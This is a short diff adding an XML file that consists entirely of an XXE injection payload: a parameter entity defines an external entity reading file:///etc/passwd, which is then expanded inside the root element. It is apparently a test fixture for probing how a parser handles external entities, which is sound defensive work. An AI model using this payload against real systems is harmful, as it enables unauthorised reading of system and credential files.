@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % p "<!ENTITY x SYSTEM 'file:///etc/passwd'>">
+%p;
+]>
+<r>&x;</r>
